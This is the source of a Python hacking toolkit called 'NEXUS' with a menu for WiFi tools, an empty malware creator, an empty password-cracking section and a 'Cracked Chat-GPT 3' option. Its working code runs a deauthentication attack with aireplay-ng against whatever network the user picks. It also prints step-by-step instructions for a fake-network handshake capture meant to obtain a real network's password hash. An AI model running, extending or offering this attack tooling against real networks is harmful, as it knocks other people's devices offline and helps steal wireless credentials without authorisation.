#!/usr/bin/python
import random
from subprocess import call
import subprocess
import json
import os
import sys

'''
    NEXUS - HACKING TOOL

Made by: AndrijaRD
Github: github.com/AndrijaRD

This code is devided in 4 sections:

    1. First section is definig logos
    and some variables like colors...

    2. Second section is for declaring
    functions that other function are
    going to use. exp. Getting Input,
    Getting Help, Clearing Screen...

    3. Third sections is going to be
    for declaring functions linked to 
    WIFI TOOLS.

    4. Fourth sections is going to be
    for declaring functions linked to
    MALWARE.

    5. Fifth section is going to be
    for declaring functions linked to
    Password Hacking

    X. Start section is going to for main
    program loop and getting main user
    input.

Everything that starts with main is connected to start uo screen, like:
    mainLogo - Logo that is displayed on startup screen
    mainOptions - Options that are displayed on startup screen
    etc.


'''

















###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###
##################################################  1. FIRST SECTION  ###################################################
###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###






















nexusFilePath = os.path.realpath(__file__)

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

main_logos = []
main_logos.append(
f'''{R}
 *@@@m   *@@@**@@@***@@@ *@@@*   *@@* *@@@*   *@@@* m@***@m@
   @@@m    @    @@    *@   @@@m  m@    @@       @  m@@    *@
   @ @@@   @    @@   @      *@@m@*     @@       @  *@@@m    
   @  *@@m @    @@@@@@        @@@      @@       @    *@@@@@m
   @   *@@m!    @@   @  m   m@**@@m    @@       !        *@@
   !     !@!    @!     m@   @   *@@m   @@       !  @@     @@
   !   *!!!!    !!   !  !   !!   !!!   !@       !  !     *@!
   !     !!!    !!     !!  !!    *!!!  !!!     !!  !!     !!
 : : :    :!! : :::!: : :: : :    : ::  : : : :!:  :!: : :! 
'''
)
main_logos.append(
f'''{W}
 ░▒█▄░▒█░▒█▀▀▀░▀▄░▄▀░▒█░▒█░▒█▀▀▀█
 ░▒█▒█▒█░▒█▀▀▀░░▒█░░░▒█░▒█░░▀▀▀▄▄
 ░▒█░░▀█░▒█▄▄▄░▄▀▒▀▄░░▀▄▄▀░▒█▄▄▄█
'''
)
main_logos.append(
f'''{O}
  ███▄    █ ▓█████▒██   ██▒ █    ██   ██████ 
  ██ ▀█   █ ▓█   ▀▒▒ █ █ ▒░ ██  ▓██▒▒██    ▒ 
 ▓██  ▀█ ██▒▒███  ░░  █   ░▓██  ▒██░░ ▓██▄   
 ▓██▒  ▐▌██▒▒▓█  ▄ ░ █ █ ▒ ▓▓█  ░██░  ▒   ██▒
 ▒██░   ▓██░░▒████▒██▒ ▒██▒▒▒█████▓ ▒██████▒▒
 ░ ▒░   ▒ ▒ ░░ ▒░ ▒▒ ░ ░▓ ░ ▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
 ░ ░░   ░ ▒░ ░ ░  ░░   ░▒ ░ ░▒░ ░ ░ ░ ░▒  ░  
    ░   ░ ░    ░   ░    ░    ░░ ░ ░ ░  ░  ░  
          ░    ░   ░    ░     ░           ░  
'''
)



Malware_logo = f'''{R}
 $$\      $$\           $$\                                             
 $$$\    $$$ |          $$ |                                            
 $$$$\  $$$$ | $$$$$$\  $$ |$$\  $$\  $$\  $$$$$$\   $$$$$$\   $$$$$$\  
 $$\$$\$$ $$ | \____$$\ $$ |$$ | $$ | $$ | \____$$\ $$  __$$\ $$  __$$\ 
 $$ \$$$  $$ | $$$$$$$ |$$ |$$ | $$ | $$ | $$$$$$$ |$$ |  \__|$$$$$$$$ |
 $$ |\$  /$$ |$$  __$$ |$$ |$$ | $$ | $$ |$$  __$$ |$$ |      $$   ____|
 $$ | \_/ $$ |\$$$$$$$ |$$ |\$$$$$\$$$$  |\$$$$$$$ |$$ |      \$$$$$$$\ 
 \__|     \__| \_______|\__| \_____\____/  \_______|\__|       \_______|
'''

WiFi_logo = f'''{R}
 $$\      $$\ $$\ $$$$$$$$\ $$\       $$$$$$$$\                  $$\           
 $$ | $\  $$ |\__|$$  _____|\__|      \__$$  __|                 $$ |          
 $$ |$$$\ $$ |$$\ $$ |      $$\          $$ | $$$$$$\   $$$$$$\  $$ | $$$$$$$\ 
 $$ $$ $$\$$ |$$ |$$$$$\    $$ |         $$ |$$  __$$\ $$  __$$\ $$ |$$  _____|
 $$$$  _$$$$ |$$ |$$  __|   $$ |         $$ |$$ /  $$ |$$ /  $$ |$$ |\$$$$$$\  
 $$$  / \$$$ |$$ |$$ |      $$ |         $$ |$$ |  $$ |$$ |  $$ |$$ | \____$$\ 
 $$  /   \$$ |$$ |$$ |      $$ |         $$ |\$$$$$$  |\$$$$$$  |$$ |$$$$$$$  |
 \__/     \__|\__|\__|      \__|         \__| \______/  \______/ \__|\_______/ 
'''

PasswordC_logo = f'''{R}
 $$$$$$$\                                                                       $$\ 
 $$  __$$\                                                                      $$ |
 $$ |  $$ |$$$$$$\   $$$$$$$\  $$$$$$$\ $$\  $$\  $$\  $$$$$$\   $$$$$$\   $$$$$$$ |
 $$$$$$$  |\____$$\ $$  _____|$$  _____|$$ | $$ | $$ |$$  __$$\ $$  __$$\ $$  __$$ |
 $$  ____/ $$$$$$$ |\$$$$$$\  \$$$$$$\  $$ | $$ | $$ |$$ /  $$ |$$ |  \__|$$ /  $$ |
 $$ |     $$  __$$ | \____$$\  \____$$\ $$ | $$ | $$ |$$ |  $$ |$$ |      $$ |  $$ |
 $$ |     \$$$$$$$ |$$$$$$$  |$$$$$$$  |\$$$$$\$$$$  |\$$$$$$  |$$ |      \$$$$$$$ |
 \__|      \_______|\_______/ \_______/  \_____\____/  \______/ \__|       \_______|
'''

configLogo = f'''{W}'''

# THESE VARIABLES ARE DECLARED HERE SO THEY CAN BE ACCESSABLE FOR WHOLE PROGRAMM
menu = "main"

mainLogo = random.choice(main_logos)

mainOptions = [
    "WiFi Tools",
    "Malware Creator",
    "Password Cracking",
    "Cracked Chat-GPT 3"
]

run = True

console_name = "console"

listOfFunctions = []
listOfLogos  = []
listOfOptions = []


def ManualConfig():
    print(f"\n\n\n{R}")
    pass

try:
    configFile = open(nexusFilePath.replace("nexus.py", "config.json"), "r")
    jsonConfig = json.loads(configFile.read())

    WLANDManM = jsonConfig[1]['value'] # WLAN Device Monitor Mode FROM CONFIG.JSON
    WLANDMonM = jsonConfig[2]['value'] # WLAN Device Managed Mode FROM CONFIG.JSON
except:
    ManualConfig()


argsBool = False
args = sys.argv
args.pop(0)
argOption = 0
try:
    argOption = int(args[0])
    argsBool = True
except:
    if len(args) > 0:
        print(f"{R}Invalid Argument.{W}")
        run = False
print(argOption)



###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###
#################################################  2. SECOND SECTION  ###################################################
###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###























# THIS FUNCTION MAKES SURE THAT USER PROVIDES AN OPTION
#
# IC - ARGUMENT STANDS FOR Input Comment AND IT'S MESSAGE THAT WILL BE 
# DISPLAYED BEFORE USERS INPUT FIELD (LEFT SIDE TEXT OF USER INPUT)
#
# EM - ARGUMENT STANDS FOR Error Message AND IT'S MESSAGE THAT WILL BE 
# DISPLAYED WHEN OPTION THAT USER TYPED IS INVALID
#
# RETURN OF -1 WILL MEAN THAT USER WANTED TO EXIT BACK TO MAIN MANU


def getUserInput(IC, EM = f"{R}!{W} INVALID OPTION {R}!{W}", toInt = True, condition = []): #IC - INPUT COMMENT  &&  EM - Error Message
    while True:
        try:
            UI = input(IC)
            if (UI == "exit"):
                return 0
            elif (UI == ''):
                continue
            elif (UI == "clear"):
                return -2
            else:
                if(toInt):
                    try:
                        UI = int(UI)
                        return UI
                    except:
                        call([ "echo", EM ])
                        continue
                else:
                    if not UI in condition and len(condition) != 0:
                        print(EM)
                    else:
                        return UI
        except KeyboardInterrupt:
            return -1



# THIS IS FUNCTION THAT IS RUN WHEN USER GET INTO TOOL
#
# example: when user enters into wifi tools this funcion is going 
# to display options for wifi and get user input then is going to 
# run function that coresponds to the option user choose
#
# tool_logo ARGUMENT IS FOR PRINTING LOGO OF THE TOOL
# tool_options ARGUMENT IS A LIST OF OPTIONS THAT TOOLS PROVIDES
# tool_functions ARGUMENT IS A LIST OF FUNCTION THAT WILL BE RUN FOR SELECTED OPTION
#
# ! IMPORTATNT ! : INDEX OF THE OPSTION HAS TO BE SAME AS INDEX OF FUNCTION THAT SHOUD BE RUN
#
# examle: 
# tool_options = ["Deauth Attack", "Disable Monitor Mode"]
# tool_functions = [ DeatuhAttack, DisableMonitorMode]
# where DeautAttack and DisableMonitorMode are function 

def ToolInput(tool_logo, tool_options, tool_functions):
    call(["clear"])
    print(tool_logo)
    if(len(tool_options) == 0):
        tool_functions[0]()
        return 0
    else:
        print(f"{W}Options:")
    for option in tool_options:
        i = tool_options.index(option) + 1
        print(f"\t{R}{i}) {O}{option}")
    print(f"\n\t{R}0){O} Return to main menu\n")
    while True:
        # UI - User Input
        UI = getUserInput(f"{R}{console_name}{W}> ", f"\n\n{R}!{W} Invalid Option {R}!{W}\nTo exit type {R}exit{W} or press {R}Ctrl+C{R} again.\n")
        if(UI == -1 or UI == 0):
            return -1
        elif(UI == -2):
            return -2
        tool_functions[UI-1]()
        print('')



# FUNCTION FOR DRAWING STARTUP SCREEN
def StartUpScreen():
    call([ "clear" ])
    print(mainLogo)
    print(f"{W}Options:")
    for option in mainOptions:
        i = mainOptions.index(option)
        print(f"\t{R}{i+1}) {O}{option}")
    print(f"\n\t{R}99) {O}Config")
    print(f"\t{R}0) {O}Exit")

def EditConfigFile():
    print(f"{R}S E T T I N G S\n")
    for setting in jsonConfig:
        print(f"\t{B}{setting['type']}{W} = {setting['value']}")
    UI = getUserInput(f"\nDo you want to modify it? [{G}yes{W}/{R}no{W}]: ", f"{R}!{W} Yes or No {R}!{W}", False, ["yes", "no"])
    if(UI == "no"):
        return -1
    else:
        pass












###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###
##################################################  3. THIRD SECTION  ###################################################
###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###




















# THIS FUNCTION STOPS MONITORING MODE AND RETURNS MANAGING MODE
#
# debug - ARGUMENT FOR ENABLING AND DISABLING OUTPUT
#
# THIS FUNCTION IS USED AS ITS OWN OPTION AND BEFORE AND AFTER DEAUTH ATTACK

def StopMonitoringMode(debug = True):
    call([ "sudo", "airmon-ng", "stop", "wlan0" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "airmon-ng", "start", "wlan0" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "airmon-ng", "check", "kill" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "ifconfig", "wlan0", "up" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "systemctl", "start", "NetworkManager" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "ifconfig", "wlan0", "down" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "iwconfig", "wlan0", "mode", "managed" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "ifconfig", "wlan0", "up" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "systemctl", "start", "NetworkManager" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "systemctl", "restart", "NetworkManager" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if debug:
        call([ "echo", f"{O}! MONITOR MODE DISBLED !" ])
        call([ "echo", f"{G}WIFI ENABLED" ])
    
    # WAIT FOR WIFI TO COME BACK BY CHECKING IF NETWORKS ARE AVAILABLE
    call([ "echo", f"Waiting for WiFi to come back..." ])
    while True:
        isEnabled = subprocess.run([ "nmcli", "dev", "wifi" ], capture_output=True, text=True)
        if not (len(isEnabled.stdout.split('\n')) < 3):
            break


def ScanNetworks():
    result = subprocess.run([ "nmcli", "dev", "wifi" ], capture_output=True, text=True)
    result = result.stdout
    result = result.replace('*', ' ')
    
    #FORMATING TABLE
    count = 0
    for line in result.split('\n'):
        if(count == 0):
            print(f"\t{O}ID{W} " + line.replace('CHAN', F'{O}CHAN{W}').replace('IN-USE', '      '))
        elif(count+1 == len(result.split('\n'))):
            print('')
            break
        else:
            # MAKE EVERYTHING IN LINE EVEN IF ID IS TWO DIGIT 
            if(count-1 < 10):   
                print(f"\t{count-1}  {B}{line}{W}")
            else:
                print(f"\t{count-1} {B}{line}{W}")
        count+=1
    result = result.replace('        ', '')
    return result



# THIS FUNCTION SCANS FOR WIFIs AND THEN TARGETS ONE OF THEM AND THEN DOSE DEAUTH ATTACK ON IT
# FIRSTLY IT RESETS WIFI AND THEN SCANS FOR AVAILABLE NETWORKS USING FUNCTION ScanNetworks()
#
# THEN IT EXTRACTS MAC ADDRESSES AND GETS ID WHICH REPRESENTS THE LINE WITH CORRECT MAC
# AFTER ALL THAT GETS THE CHANNEL AND THEN STARTS THE ATTACK

def StartDeauthAttack():
    #WIFI RESTART
    call([ "echo", f"{G}Reastarting NetworkManager..." ])
    StopMonitoringMode(False)
    
    #Creating WIFI Table
    ### call([ "echo", deauth_logo ])
    result = ScanNetworks()

    #EXTRACTING MAC ADDRESSES
    MACs = []
    for line in result.split('\n'):
        MACs.append(line.split(' ')[0])
    MACs.pop(0)
    MACs.pop(len(MACs)-1) #REMOVE LAST ITEM BECOSE ITS EMPTY STRING

    #GETTING ID AND VERIFYING IT
    ID = getUserInput(f"Enter WiFi {O}ID{W}: ", f"\n\n{R}Invalid ID{W}. If you want to exit type{R} exit{W}.\n")
    while True:
        if (ID < len(MACs) and ID > -1): #CHECKING IF ID IS VALID
            break
        elif (ID == -1): #CHECKING FOR EXIT CODE
            print(f"\n{R}Exiting...")
            return -1
        else: #ELSE TRY AGAIN
            print(f"\n{R}Invalid ID{W}: {ID}-{len(MACs)}\n")
            ID = getUserInput(f"Enter WiFi {O}ID{W}: ", f"\n\n{R}Invalid ID{W}. If you want to exit type{R} exit{W}.\n")

    #GETTING CHANNEL AND VERIFYING IT
    CH = getUserInput(f"Enter WiFi {O}CHAN{W}: ", f"\n{R}Invalid CHANNEL{W}. If you want to exit type{R} exit{W}.\n")
    while True:
        if ("  " + str(CH) in result.split('\n')[ID+1] and CH > -1): # CHECK IF TAHT LINE CONTAINS THAT CHANNEL NUMBER
            break
        elif (CH == -1): #CHECKING FOR EXIT CODE
            print(f"{R}Exiting...")
            return -1
        else: #ELSE TRY AGAIN
            print(f"\n{R}Invalid CHANNEL{W}\n")
            ID = getUserInput(f"Enter WiFi {O}CHAN{W}: ", f"\n{R}Invalid CHANNEL{W}. If you want to exit type{R} exit{W}.\n")

    #RUNNING CUSTOM COMMANDS
    call([ "sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "service", "NetworkManager", "restart" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "sudo", "airmon-ng", "start", "wlan0" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    call([ "echo", f"{O}! DEVICE ENTERED MONNITOR MODE !" ])

    call([ "sudo", "iwconfig", "wlan0", "channel", str(CH) ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

    call([ "echo", f"{G}ATTACK STARTED!" ])
    call([ "echo", f"To stop the attack just press {R}Ctrl+C{W}.\n" ])
    
    try:
        call([ "echo", f"{B}WIFI IS DOWN{W}" ])
        call([ "echo", f"{O}Command: {W}sudo aireplay-ng -0 0 -a {MACs[ID]} wlan0" ])
        call([ "sudo", "aireplay-ng", "-0", "0", "-a", MACs[ID], "wlan0" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    except KeyboardInterrupt:
        print(f"{R}EXITING...{W}")
        StopMonitoringMode()
        return 0


def HalfWayHandshake():
    print(f"\n\n{C}H A L F W A Y   H A N D S H A C K E{W}\n")
    print(f"\t {C}Halfway handshake{W} is when you create fake network that\n\t a device that knows a WiFi by that {B}name(SSID){W} tryies to\n\t connect to it fails and then you capture the {B}hash file{W}\n\t in wich is written password to the real network by that\n\t name.  \t   - Hash can be decoded with option {R}4){W}.\n")
    print(f"{B}-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-{W}\n")
    print("Steps: ")
    print(f"  \t{R}1. {W} Create a fake network by the name of the real network that you want crack. \n\t(You can can create this fake network using Hotspot)")
    print(f"\n\t{R}2. {W} Open new terminal and enable Monitor mode on your WiFi device using this command:\n\t{O}Command: {P}sudo airmon-ng start wlan0{W} \n\t(Where you are going to replace wlan0 with your WLAN Device).")
    print(f"\n\t{R}3. {W} Now you run {O}Command:{P} sudo airodump-ng wlan0 {W}\n\t(wlan0 can be replaced with your WLAN Device like wlan0mon or other)")
    print(f"\n\t{R}4. {W} Find your network copy its MAC address and remember its CHANNEL(CH).")
    print(f"\n\t{R}5. {W} Set Network Card to specified network and run Wireshark at the same time. \n\t{O}Command: {P}sudo airodump-ng wlan0 -c 6 & wireshark{W}\n\tBut replace the number 6 with Channel from the last step")
    print(f"\n\t{R}6. {W} After entering Wireshark and selectiong WLAN Device form \n\tmenu on welcome screen in the filter bar add: \n\t{O}Command: {P} wlan.ta == $MAC || wlan.da == $MAC{W} \n\tReplace \"$MAC\" with MAC address from 4. step")
    print(f"\n\t{R}7. {W} When you the device tryes to connect with password from the real \n\tnetwork you are going to see changes in Logs and then continue to step 8.")
    print(f"\n\t{R}8. {W} Now that Device tryed to connect and failed replace filter \n\tcommand with {O}Command: {P}aepol{W} \n\tClick Enter and you shoud see packets: \n\t{B}Message 1 of 4{W} and {B}Message 2 of 4{W}.")
    print(f"\n\t{R}9. {W} Replace filter command with: \n\t{O}Command: {P}aepol || wlan.ta == $MAC || wlan.da == $MAC{W}")
    print(f"\n\t{R}10.{W} Stop Capturing Packets by clicking red button in top-right corner.")
    print(f"\n\t{R}11.{W} Export {B}File{W}>{B}Export Specified Packets{W} \n\tGive it a name and {O}Export as: {P}Wireshark/tcpdump/...-pcap{W}")
    print(f"\n Type {P}clear{W} to clear the screen.")


def TwoWayHandshake():
    pass

handshakeTypes = [
    "Half-Way Handshake",
    "2-Way Handshake",
    "4-Way Handshake"
]
handshakeFunctions = [
    HalfWayHandshake,
    TwoWayHandshake
]
def CaptureHandshake():
    print(f"\nWhat {C}Handshake{W} do you want to capture:\n")
    for handshake in handshakeTypes:
        i = handshakeTypes.index(handshake)
        print(f"\t{C}{i}) {G}{handshake}")
    print("")
    UI = getUserInput(f"{C}Handshake{W}> ")
    handshakeFunctions[UI]()





def PasswordHandshake():
    pass

def NmapScanning():
    pass

WiFi_options = [
    "Deauth Attack",
    "Disable Monitor Mode",
    "Capture Handshake",
    "Password Cracking using Handshake",
    "Network Scannig (Nmap)"
]
WiFi_functions = [
    StartDeauthAttack,
    StopMonitoringMode,
    CaptureHandshake,
    PasswordHandshake,
    NmapScanning
]









###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###
#################################################  4. FOURTH SECTION  ###################################################
###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###






















Malware_options = [
    
]
Malware_functions = [
    
]


###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###
##################################################  5. FIFTH SECTION  ###################################################
###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###


















PasswordC_options = [

]
PasswordC_functions = [

]















###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###
##################################################  5. FIFTH SECTION  ###################################################
###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###












def setupToken():
    pass


def ChatGPT3():
    if(jsonConfig[3]["value"] == ""):
        setupToken()
    print(f"If you want to output ChatGPT answer to a file just add {P}--output{W} to the end of a question.\n")
    while True:
        Question = input(f"{B}Question>{W} ")
        if(Question == 0 or Question == -1):
            return

        save = False
        if("--output" in Question):
            save = True
            Question = Question.replace("--output", "")
        
        call([ "chmod", "+x", "./chatgpt.sh" ])
        print(["./chatgpt.sh", f"{Question}"])
        if(not save):
            subprocess.Popen(["./chatgpt.sh", f"{Question}"], text=True).communicate()
        else:
            subprocess.Popen(["./chatgpt.sh", f"{Question}"], shell=True, text=False).communicate()
            

        print(f"{G}Done!{W}\n")






ChatGPT3_options = [

]
ChatGPT3_functions = [
    ChatGPT3
]
    


###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###
##################################################  X. START SECTION  ###################################################
###                                                                                                                   ###
#########################################################################################################################
###                                                                                                                   ###








listOfOptions = [
    WiFi_options,
    Malware_options,
    PasswordC_options,
    ChatGPT3_options
]
listOfFunctions = [
    WiFi_functions,
    Malware_functions,
    PasswordC_functions,
    ChatGPT3_functions
]
listOfLogos = [
    WiFi_logo,
    Malware_logo,
    PasswordC_logo,
    ""
]

UserExit = False
StartUpScreen()
print(" ")
redraw = False  # If this value is True program will skip user input and just redraw screen from last option
                # This variable is used for command clear where screen will just be redrawn by reentering

while run:
    console_name = "console"
    if not redraw and not argsBool:
        selectedOption = getUserInput(f"{W}{console_name}> ")
    else:
        selectedOption = argOption
        argsBool = False
        redraw = False
    if (selectedOption == -1 and not UserExit): # IF USER TRY TO EXIT GIVE HIM A WARNIGN THAT HE IS ABOUT TO EXIT IF IT'S HSI FIRST TIME
        print(f"\n\nTo exit type {R}exit{W} or press {R}Ctrl+C{R} again.\n")
        UserExit = True
        continue
    elif (selectedOption == -1 and UserExit): # EXITING USING KEYBOARD
        print(f"\n{R}Exiting...")
        break
    elif (selectedOption == 0):
        print(f"\n{R}Exiting...")
        break
    elif (selectedOption == -2):
        StartUpScreen()
    elif (selectedOption == 99):
        EditConfigFile()
    else:
        if(selectedOption <= len(mainOptions) and selectedOption > -1):
            console_name = mainOptions[selectedOption-1]
            menu = console_name
            retValue = ToolInput(listOfLogos[selectedOption-1], listOfOptions[selectedOption-1], listOfFunctions[selectedOption-1])
            if(retValue == -2):
                redraw = True
            StartUpScreen()
        else: 
            print(f"{R}!{W} INVALID OPTION {R}!{W}\n")

